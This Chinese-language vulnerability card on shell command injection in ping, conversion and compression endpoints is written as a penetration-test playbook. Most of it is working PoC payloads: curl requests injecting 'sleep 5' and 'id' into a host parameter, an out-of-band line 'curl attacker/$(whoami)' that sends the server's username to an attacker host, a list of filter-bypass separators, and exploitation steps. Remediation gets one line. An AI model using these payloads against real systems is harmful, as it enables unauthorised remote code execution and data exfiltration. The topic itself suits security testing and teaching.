---
title: 命令注入（分号 / 反引号 / $() 与盲注外带）
cve: 无（实现缺陷）
severity: critical
cvss: 9.1
product: 任何调用 shell 的功能（ping/traceroute/转换/压缩）
versions: 任意
ports: 80, 443
keywords: 命令注入, rce, ping, 反引号, 盲注, shell
entry: 参数被拼进 system/exec/popen
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

- 有 `host/ip/url/path` 类参数，功能是网络诊断、图片转换、备份压缩；
- 响应时间随输入变化（`sleep`）。

## 前置条件

- 参数进入 shell（未用参数数组）。

## PoC

```bash
# 1) 时间盲注判定（最稳，不改状态）
curl -s -o /dev/null -w '%{time_total}\n' 'https://target/api/ping' \
  --data-urlencode 'host=127.0.0.1; sleep 5'
# ≥5s = 命中

# 2) 回显验证
curl -s 'https://target/api/ping' --data-urlencode 'host=127.0.0.1; id'
# 判定：返回 uid= = RCE

# 3) 无回显 → 带外
curl -s 'https://target/api/ping' --data-urlencode 'host=127.0.0.1; curl attacker/$(whoami)'
```

```bash
# 4) 分隔符大全（被过滤时逐个试）
#   ;  |  ||  &  &&  `cmd`  $(cmd)  %0a  \n
```

## 利用步骤

1. 先 `sleep 5` 判定；
2. 再 `id` 回显；
3. 带外确认（curl/nslookup）；
4. 证据：耗时对比 + 回显。

## 修复与缓解

- 用参数数组（禁 shell）；白名单校验 host；沙箱执行。

## 参考

- OWASP 命令注入；CWE-78。
